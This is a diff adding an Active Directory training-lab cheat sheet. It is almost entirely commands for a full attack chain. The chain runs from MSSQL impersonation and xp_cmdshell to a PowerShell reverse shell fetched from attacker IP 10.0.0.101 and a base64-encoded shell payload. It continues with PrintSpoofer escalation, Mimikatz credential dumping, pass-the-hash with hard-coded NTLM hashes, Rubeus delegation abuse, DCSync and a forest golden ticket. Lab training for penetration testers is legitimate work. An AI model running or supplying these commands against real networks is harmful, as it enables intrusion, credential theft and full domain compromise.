@@ -1,0 +1,422 @@
+# Rootoon17 AD Training Labs - CheatSheet
+
+## Lab 1: Enumeration
+
+##### Open PowerShell Terminal
+
+##### Gathering every information about the current user
+
+```
+whoami /all
+```
+
+##### Enumerate User and Domain Information with PowerView.ps1
+
+##### The C:\Tools folder that contains the necessary tools for enumeration and exploitation. 
+
+```
+cd C:\Tools
+powershell -ep bypass 
+. .\PowerView.ps1
+```
+
+##### Find all the local users.
+
+```
+Get-LocalUser
+```
+
+##### Gather information about the network. Display all network interfaces, IP, and DNS
+
+```
+ipconfig /all
+```
+
+##### Find domain-related information.
+```
+Get-Domain
+```
+##### Enumerate domain users.
+```
+Get-DomainUser | select cn
+```
+##### List all groups in the current domain:
+```
+Get-NetGroup
+```
+##### List all members of a specific group:
+```
+Get-NetGroupMember "Domain Admins" | select MemberName
+```
+##### List all domain trusts for the current domain:
+```
+Get-NetDomainTrust
+```
+##### List all the domain computers
+```
+Get-NetComputer | select name
+```
+##### Find interesting acls
+```
+Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights
+```
+##### Find Kerberoastable accounts 
+```
+Get-NetUser -SPN | select samaccountname, serviceprincipalname
+```
+##### Check if TrustedToAuth is enabled for any domain user.
+```
+Get-NetUser -TrustedToAuth
+```
+##### The user "appservice" could be vulnerable to Constrained Delegation attack.
+
+## Lab 2: Local Privilege Escalation
+
+##### Check Current running user
+```
+whoami
+```
+##### Check local administrator users
+```
+net localgroup administrators
+```
+##### Run the powerup.ps1 script to find any privilege escalation flaw on the machine.
+```
+cd  C:\Tools\
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+##### Abuse AxInstSV service
+```
+Invoke-ServiceUserAdd AxInstSV
+```
+##### Open Powershell prompt and enter local admin creds to access elevated prompt
+
+## Lab 3: Abusing MSSQL Role Permission
+
+##### Extract the "HeidiSQL_9.4_Portable.zip" file.
+
+```
+Expand-Archive C:\Tools\HeidiSQL_9.4_Portable.zip C:\Tools\
+```
+#### Run HeidiSQL
+
+```
+C:\Tools\heidisql.exe
+```
+##### Start a new session and connect to the dbserver.
+
+##### Click on "New."
+
+##### Do the following configuration:
+
+- Give any suitable name to the session, e.g., "demo." 
+- Select network type as "Microsoft SQL Server (TCP/IP)"
+- Set Hostname/IP to "dbserver.dbcenter.infosec.local"
+- Select "Use Windows authentication"
+- Click on "Save."
+
+##### Details about the current login.
+```
+SELECT SYSTEM_USER;
+```
+##### Check whether it has admin privileges or not.
+```
+SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+##### Access the "RESEARCHERS" and "Records" databases with the "alice" user.
+```
+USE RESEARCHERS;
+USE Records;
+```
+##### Check if any users can be impersonated.
+```
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+```
+
+`SELECT distinct b.name`: This part of the query specifies the columns to be returned in the result set. It selects the `name` column from the `sys.server_principals table`, which represents the names of server principals (logins).
+
+`FROM sys.server_permissions a`: Here, the query starts by defining an alias a for the `sys.server_permissions` table. This table stores information about server-level permissions.
+
+`INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id`: This part of the query performs an inner join between two tables: `sys.server_permissions` (aliased as `a`) and `sys.server_principals` (aliased as `b`). The join condition specifies that rows in `a` with `a` `grantor_principal_id` equal to `principal_id` in `b` should be matched. This essentially links the permission information with the corresponding server principal (login) information.
+
+`WHERE a.permission_name = 'IMPERSONATE'`: This is a filter condition applied to the joined tables. It restricts the result set to only include rows where the permission_name column in the `sys.server_permissions` table is equal to 'IMPERSONATE'. In other words, it selects only those permissions that involve impersonation.
+
+`DISTINCT`: This keyword ensures that only distinct (unique) server principal names are returned in the result set. If there are multiple rows with the same name due to multiple permissions, only one unique name will be included in the result set.
+
+In summary, this query retrieves the names of server principals (logins) that have been granted the 'IMPERSONATE' permission at the server level. It uses an inner join to associate permission information with the corresponding login names and ensures that only distinct login names are included in the result set.
+
+##### Try to impersonate the "sa" user.
+```
+EXECUTE AS LOGIN = 'sa'
+```
+##### try to impersonate the "dbmaintainer" user and verify.
+```
+EXECUTE AS LOGIN = 'dbmaintainer'
+SELECT SYSTEM_USER
+```
+##### Impersonate the sa login
+```
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+```
+##### Confirm whether we have admin privileges or not.
+```
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+##### Check if xp_cmdshell is enabled.
+```
+EXEC xp_cmdshell "whoami"
+```
+## Lab 4: Gain Reverse shell on MSSQL Server
+
+##### Navigate to the path "C:\Tools" and open the script named "Invoke-PowerShellTcpOneLine_443.ps1"
+
+##### Make two copys of the above file on the Desktop
+
+1. Invoke-PowerShellTcpOneLine_4444.ps1
+
+2. Invoke-PowerShellTcpOneLine_1337.ps1
+
+##### Open ```Invoke-PowerShellTcpOneLine_4444.ps1``` file and set Attacker Machine IP address i.e ```10.0.0.101``` and reverse shell port ```4444```
+
+##### Open ```Invoke-PowerShellTcpOneLine_1337.ps1``` file and set Attacker Machine IP address i.e ```10.0.0.101``` and reverse shell port ```1337```
+
+##### Open HFS, and set ```Invoke-PowerShellTcpOneLine_4444.ps1 & Invoke-PowerShellTcpOneLine_1337.ps1``` script to serve on the web server
+
+##### Start The Powercat Listener
+```
+cd C:\Tools
+powershell -ep bypass
+. ./powercat.ps1
+powercat –l –p 4444 –v –t 1000
+```
+##### Go back to HeidiSQL and execute the query below:
+```
+EXEC xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/Invoke-PowerShellTcpOneLine_4444.ps1')";
+```
+##### Switch back to the Powercat window
+
+##### IF YOU DON"T SEE REVERSE SHELL HIT "ENTER" <-----
+
+##### Check the current running user
+```
+whoami
+```
+## Lab 5: NT Service to NT Authority Privilege Escalation
+
+##### Generate a bat file of a Invoke-PowerShellTcpOneLine_1337.ps1 powershell script
+```
+cd C:\Tools
+powershell -ep bypass
+. .\Invoke-Encode.ps1
+cd C:\Users\Alice\Desktop
+Invoke-Encode -DataToEncode C:\Users\Alice\Documents\Invoke-PowerShellTcpOneLine_1337.ps1 -OutCommand
+cat .\encodedcommand.txt
+```
+##### Make a encoded command into a .bat file ## Careful while copying the data
+```
+echo "powershell -e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAagBWAEYAZABpADkAcABBAEYASAAwAFgALwBBADgAWAAxAGoAWQBKADEAUwBHAHUAMgBNAEsASwBDADEAdABwAGkANwBDAG8AcgBKAFkAKwBpAEEAKwBUAHoATQBXAGsATwA1AG0ARQB6AEYAVgBYAGQAdgAzAHYAbgBaAGsAawByAG8AVQB1AFcALwBJAHcAdwA4ADMANQBtAG4AdQB1ADcAawBDAG4AVwBTAEUAUgB1AEIASwBnAE0AeQA0AGwAbABMAGoASABVAGkAUABvAEIASwBWAGsATQBDADgAbwB6AFoAVgAyAEEARABNAHAAegBQADgAcwAzADYATQBBAHkAawBIAHoAdgBjAEUAVgBQAEUAWQBHADcAZABiAFYAVAB4AFgAbgBXAFkAYQBLAEgARABoAE8AdQBOAG8AaQBVAEkASwBRADgARgBMAEUAdQBUAEMAawA2AFEASwA0AEUAQwBYAHEAUwByAEQASQBTAHcASwAxAHkAeQBJAHMASQBWAFUATwBHADYASABNAEQAeQBCAFQAWgBUAFEAZgBuAEIAWABZAFYATQA2ADYAbABqAGQAYwBEAFEAZQBiAHIAdAAzAHEAeABEAEsAMQBqAG0ATwBZADQAYQBFADMAagAzADUAagBUAEwAQQA4AGEAcwBLAE0AegBaAEQAWQBNAG8AOABmAGsAVABSAGIAVABSAFkAVABoAC8AUwA5AGYAcwBqAHMAMQB3AC8ANwBYAHIAYwAvAEcASAB3AEoAUgBoADEATgBKAGYATABNAGkATgBSAHkANwBBAGYAUwAwAHMAMwA4AFkATABTAE8AagBvAFQAcgB6AGEAWgBqAFQAMgAxAEEASQBXAE8AZgBoADgAUABCADgATwBYAEQAYwAzAGcAYQBIAFoASgBVAG8AdQA5ADMAVQBrAHUAdgBoAE4AZwBEAGMAdQBGAFgAKwBDADYARQBYAGEAaQB1ADcAQgA3AFYAbABwAEkAZwBnAEoANQBDAEMASQBQAG4AVQBVAGQAdwA0AG8AYgBuAFgANABUAHYAcgBZADQARgB6AG4AaQBHAHoAVABOAFcAKwBFAFQAcwBiAGoAbQBaAFQAcgArAFoAQgBZAHQAVQBiAFkATQA2AG4ANwBrADIATAB0AFkAawB0AFMAOQBCAEoAUwBJAGUAUAAxAHIAUgBGAEoAKwBnAGMAcgBpACsALwBkAGkASABGADUAagB2AHEARgBmAFIANABBAEoANgBEAFMANQA1AFEALwB3AEUAMwBtAEkASgBuAGoAbgA5ADQAaQBBAEMAdAB1AEMAVQAyAE8ARQB0AGUARABYAEgARwBGAHIANQBOAGQAbABnAFcARwBmAGEAMwBOAHkANABqAEMANwBiAFYANQB2AEoAZgAzAFUANAByADUAagA5AEsAbABOAEMALwA2AHgAagBjAHAALwB2AHoAWAByAE8AMgBPADkAeQBwAHgATQAvAE8ASQAyAGEAVgBpAFkAeQAxACsAZwBIADcAWgBiAHAAWABXAGYAagB5ADYAMwA5AGIAOQBmAEIARwA5AFgAUwArAEkAMQBXAHgAOABhAHAANgBaAE4AcwAzAEkAagArADEAZQBOAGYAWQBkADUAcgB6AE8AbQA0AHQAbQBqADgALwBoAHIAcgBIAGwAMgBKAGcAUwBXADkAYgB0AEUASgA2AFgATwBnAGsAOQAzAE0ASAB3AD0APQAnACkAKQApACkALAAgAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALAAgAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA" | Out-File -encoding ascii shell.bat
+```
+##### Add PrintSpooler64.exe & shell.bat file to HFS 
+
+##### Download both the files on the DBServer machine
+```
+Invoke-WebRequest -Uri 'http://10.0.0.101/shell.bat' -OutFile 'C:\Users\Public\shell.bat'
+```
+```
+Invoke-WebRequest -Uri 'http://10.0.0.101/PrintSpoofer64.exe' -OutFile 'C:\Users\Public\PrintSpoofer64.exe'
+```
+
+##### Open another Powershell session to start another listener on 1337.ps1 
+```
+cd C:\Tools
+powershell -ep bypass
+. ./powercat.ps1
+powercat –l –p 1337 –v –t 1000
+```
+
+##### Switch to C:\Users\Public\ directory.
+```
+cd C:\Users\Public\
+```
+```
+.\PrintSpoofer64.exe -c "C:\Windows\System32\cmd.exe /c C:\users\public\shell.bat"
+```
+##### Go back to the Powercat listener
+
+##### IF YOU DON"T SEE REVERSE SHELL HIT "ENTER" <-----
+
+##### Check the current running user
+```
+whoami
+```
+## Lab 6: Pass The Ticket
+
+##### Add PowerView.ps1 and Mimikatz.ps1 script to HFS
+
+##### Run Mimikatz on the DBServer
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/Invoke-Mimikatz.ps1')
+```
+```
+cd C:\Users\Public
+```
+```
+Invoke-Mimikatz -Command '"sekurlsa::tickets"'
+
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+```
+```
+Invoke-Mimikatz -Command '"kerberos::ptt [0;221df]-2-0-60a10000-dbadmin@krbtgt-DBCENTER.INFOSEC.LOCAL.kirbi"'
+```
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/PowerView.ps1')
+```
+```
+Find-LocalAdminAccess
+```
+```
+Invoke-Mimikatz -Computername webprod.dbcenter.infosec.local
+```
+
+## Lab 7: Pass The Hash
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/PowerView.ps1')
+
+```
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/Invoke-Mimikatz.ps1')
+```
+
+##### Find All Interesting ACLs
+```
+Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights
+```
+##### Get the details about datacenter group
+```
+Get-NetGroup -Identity datacenter
+```
+##### Find the ACL Access to the webdev user
+
+```
+Invoke-ACLScanner | ?{$_.IdentityReferenceName -match "webdev"}
+```
+
+##### Add user "alice" to the "Datacenter" group.
+```
+Add-DomainObjectAcl -TargetIdentity "Datacenter" -PrincipalIdentity "webdev" -Rights All -verbose
+```
+
+```
+Add-DomainGroupMember -Identity 'Datacenter' -Members 'alice' -verbose
+```
+
+#### Load PowerView again on the new powershell terminal
+
+```
+cd C:\Tools
+powershell -ep bypass
+. ./PowerView.ps1
+. .\Invoke-Mimikatz.ps1
+```
+
+##### Perform PTH Attack on webdev user
+
+```
+Invoke-Mimikatz -command '"sekurlsa::pth /user:webdev /domain:dbcenter.infosec.local /ntlm:30b6be15959943c929411c07a140510c /run:powershell"'
+```
+
+#### Load PowerView again on the new powershell terminal
+
+```
+cd C:\Tools
+powershell -ep bypass
+. ./PowerView.ps1
+```
+
+##### Add user "alice" to the "Datacenter" group.
+```
+Add-DomainObjectAcl -TargetIdentity "Datacenter" -PrincipalIdentity "webdev" -Rights All -verbose
+```
+```
+Add-DomainGroupMember -Identity 'Datacenter' -Members 'alice' -verbose
+```
+
+##### Use the PTH to refresh the security token for the current user alice, without requiring a system reboot. 
+```
+Invoke-Mimikatz
+```
+```
+Invoke-Mimikatz -command '"sekurlsa::pth /user:alice /domain:dbcenter.infosec.local /ntlm:bd4ca1fbe028f3c5066467a7f6a73b0b /run:powershell"'
+```
+##### Access appsrvdev.dbcenter.infosec.local.
+```
+Enter-PSSession appsrvdev.dbcenter.infosec.local
+```
+
+## Lab 8: Finding Sensitive Account NTLM Hash
+
+##### Extract login passwords from memory using the "sekurlsa" module.
+
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
+```
+##### Check Constraine Delegation Enable/Disable for appservice user
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/PowerView.ps1')
+```
+```
+Get-DomainUser -Identity appservice
+```
+## Lab 9: Constrained Delegation Attack
+
+##### Perform PTH to start a session as appservice user.
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:appservice /domain:dbcenter.infosec.local /ntlm:9f4cebf5ec79517cb86636f8e0eb67a5 /run:powershell.exe"'
+```
+
+##### Perform Constrained Delegation Attack
+```
+cd C:\Tools 
+.\Rubeus.exe tgtdeleg # Requesting a delegation TGT.
+```
+
+##### Impersonating the domain administrator user and requesting ldap service TGS and passing the ticket
+```
+. \Rubeus.exe s4u /ticket:doIFhDCCBYCgAwIBBaEDAgEWooIEZzCCBGNhggRfMIIEW6ADAgEFoRgbFkRCQ0VOVEVSLklORk9TRUMuTE9DQUyiKzApoAMCAQKhIjAgGwZrcmJ0Z3QbFkRCQ0VOVEVSLklORk9TRUMuTE9DQUyjggQLMIIEB6ADAgESoQMCAQKiggP5BIID9XC/rFXIYEMDWeB239gp6ebLphhBYqFXigZjDHLWS4PGzboSzSQ/7GoCyh0VkOocmYYOOld3LoOWDfUYnJb+XeqVo4IXqjSJAIw5ELqtwLEFaFNn4oSbEXarB38BANP7Qt397zKX9B5PfAyN4nyFjfm4h5pN9G7tL2mQB6kq6QdXbx2yBnJy3n0zSufEpI6q9lUnJ8/BkzzBwm2fnttabyTFg252hWH2ZjEUlfguWpIsfcoehGtbnoVPYCYPn1gOKdbRYMfewrs0b0C86+8J/5RHIAdZYAvKcyuVPdZGvih2VWRzvd68Na0TYh05aXfj0JiFfpL2LXZuWFF4N6GofKSYoG7zzNX+AVgmi/waS19U4Gke76RyZV31B0EZaIoa0483wIdMgr/6RxhVmyEK+/EfZFFRjrKwLIjXNU1suxVAvg6/vOLZ3Hova7iR0bxN7Pyx8lWV1Ay4v3fPJbuFHDfhFpemtgEcvzmu6NHyey+45q6oMtFoKtLFl3uCyEvnpY23pQBWKkBbSennHsDs9rGILKoBST/CNKAaV6mwPeP6QuMR6wLcFA0NDzzeBoV+3FpzbL4xDDrPlumx0J0IzLo8FJ5t8udUTN/ATqKnF6a87YWSP/PePIBus6lbSUkz0E3Vh0eBBr0Tc6fOlMDreEPjYPIYhQsSgAK88DmpydV1BiXCye2eLfuvK4BxHD/IhnhhLHuEqkvfRyw0VMmqzFuoYUTTjg+x+7p/MtDFgCwNsxJ220HPt4c1er5RCxYGYYfXEQBsrgCH5aTJ/sABJanabY50FN16gn+Gd2dGoSIOHqNa+f3U+sIk0yKCvxkwyQEdC490Efs4PNT8/SKsXj9q5F1q8KrNvw3k72gv/qhjY6JB6KjUyYCeQuJSfGX9D4iv2vwStYUTp+bjIf83ScnZ66ozfAeXMw0IeWFHVVcm+O/HVO453/JrIp6X9Jjx8J4bbU66tKEn4/9GLQV6dQK+UECIV0kt1x3CHudfe+E0aQv6rSs71qNPIIutFgJKhPG+I/zhmQUm72bCMDAyLevuz2jLYcW64sa11fh4QgiwLCGJZEZguxYg/u8QLIn1yJa4NfOUNfZURLgTQJvZHSueveF3f8dTDkWj4KmPfLjoqLqLNlWxiMWKLIZ+cpLM9WV8I46Qz2rYRyaMC5i3JSI2hnB70iEf8dwKIFG7XOL9fSBF/CEehJz55rrzX6sdUGoKa1P/khrKuFKwy9ybtXe7zXgc5gfxshOdNGVh8WK5VgPQIWs/T+tbJw61JSD2s6L9KkxlntH3LnHjbM4TUKnQWsFaD4RRxjK5OVBjxAWAsRt9Bzqa5HL3wewC63tnkTtou24Io4IBBzCCAQOgAwIBAKKB+wSB+H2B9TCB8qCB7zCB7DCB6aArMCmgAwIBEqEiBCAXAmn1pY0g7yLJd7nZqRS2V9a3mtNw90u8ERqXfg5dBaEYGxZEQkNFTlRFUi5JTkZPU0VDLkxPQ0FMohcwFaADAgEBoQ4wDBsKYXBwc2VydmljZaMHAwUAYKEAAKURGA8yMDIzMDkyMjA4MDYzOVqmERgPMjAyMzA5MjIxODA2MzlapxEYDzIwMjMwOTI5MDgwNjM5WqgYGxZEQkNFTlRFUi5JTkZPU0VDLkxPQ0FMqSswKaADAgECoSIwIBsGa3JidGd0GxZEQkNFTlRFUi5JTkZPU0VDLkxPQ0FM /impersonateuser:administrator /domain:dbcenter.infosec.local /msdsspn:cifs/prod.dbcenter.infosec.local /dc:prod.dbcenter.infosec.local /altservice:LDAP /ptt 
+```
+##### Performing DCSync Attack to extart krbtgt hash.
+```
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.101/Invoke-Mimikatz.ps1')
+```
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dbcenter\krbtgt"'
+```
+## Lab 10: Forest Wide Golden Ticket
+
+##### Extract DomainSID and Enterprise Admins objectsid
+```
+Get-DomainSID
+Get-DomainGroup -Identity "Enterprise Admins" -Domain infosec.local -Properties objectsid
+```
+##### Generating Forest Wide Golden Ticket
+```
+Invoke-Mimikatz -command '"kerberos::golden /user:administrator /domain:dbcenter.infosec.local /sid:S-1-5-21-311081478-4156012093-3875638631 /sids:S-1-5-21-4196253130-234316280-3721040813-519 /krbtgt:75f06dfe8968a165c802fe1cc7e1f7c8 /ptt"'
+```
+##### Check access to both the DCs.
+```
+dir \\prod.dbcenter.infosec.local\c$
+dir \\offsec.infosec.local\c$
+```
+```
+Enter-PSSession offsec.infosec.local
+```
+```
+Enter-PSSession prod.dbcenter.infosec.local
+```
